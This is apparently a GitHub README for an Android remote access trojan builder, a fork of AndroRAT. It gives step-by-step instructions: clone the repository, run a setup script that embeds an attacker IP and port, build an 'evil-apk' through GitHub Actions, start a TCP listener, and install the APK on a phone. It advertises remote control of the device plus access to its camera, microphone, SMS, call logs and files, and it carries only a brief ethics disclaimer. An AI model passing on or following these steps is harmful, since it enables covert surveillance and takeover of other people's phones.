# AndroRat-JavaShell-Android
A Java Reverse Shell is a type of script that establishes a network connection between a target machine and an attacker’s machine in a reverse fashion. In typical communication, the attacker 
Project Setup and Usage
Prerequisites

Python 3.x - Ensure Python 3.x is installed on your system.
GitHub Account - You need a GitHub account for using GitHub Actions.

Setup Instructions
Clone the Repository

    git clone https://github.com/khilesh114/AndroRat-JavaShell-Android
    cd AndroRat-JavaShell-Android

Run the Setup Script

Execute the setup script to configure the project:

    python3 setup.py

Follow the prompts:

Login or create a GitHub account - Type y if you have an account or create one.
Enter the IP address for the payload - Input the IP address where the payload should connect.
Enter the port number for the payload - Input the port number for the payload.

This will create a GitHub Actions workflow file at .github/workflows/main.yml.

Verify Workflow Execution

Once the GitHub Actions workflow runs successfully, you can download the APK file from the GitHub Actions artifacts section:
Go to your repository on GitHub.
Click on the 'Actions' tab.
Select the most recent workflow run.
Click on the 'Artifacts' section to download the evil-apk file.



Additional Steps

Edit IP and Port in tcp_listener.py

Modify the IP address and port number in the tcp_listener.py file to match the ones you used during setup.

Run the TCP Listener

    python3 tcp_listener.py

Install the APK

Install the APK on your Android device. You may need to enable installation from unknown sources.

Exploit Your Phone

Follow the instructions provided by the APK to exploit the device.


Important Notes

Ethical Usage: Ensure you have explicit permission to exploit any Android device. Performing these actions without authorization is illegal and unethical. Only use this tool in a controlled and authorized environment.
Happy Hunting: Proceed with caution and make sure you're adhering to ethical guidelines.
Credits

This project is based on the original AndroRAT by karma9874. We acknowledge the hard work and contributions of the original authors and contributors.

Special thanks to:

https://github.com/karma9874/AndroRAT : For developing and maintaining the original AndroRAT project.

If you have any questions or wish to contribute to the original project, please refer to their https://github.com/karma9874/AndroRAT.

Features

Remote control of Android devices
Access to device features such as camera, microphone, SMS, and call logs
Manage applications installed on the device
File management and transfer








